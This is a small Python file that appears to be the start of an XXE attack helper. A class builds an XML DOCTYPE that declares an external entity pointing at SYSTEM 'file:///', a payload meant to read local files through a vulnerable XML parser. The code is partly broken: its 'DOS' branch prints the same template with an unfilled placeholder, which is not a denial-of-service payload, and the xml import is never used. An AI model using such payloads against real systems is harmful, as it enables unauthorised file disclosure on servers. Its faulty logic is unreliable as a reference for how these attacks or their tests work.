import xml

class xxe_builder:

    def __init__(self,motive,entity):
        self.__motive = motive
        self.__entity = entity

    def generate_injections(self):
        
        text = ""

        if self.__motive == "injection":
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'.format(str(self.__entity))
        elif self.__motive == "DOS":
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'
        
        print(text)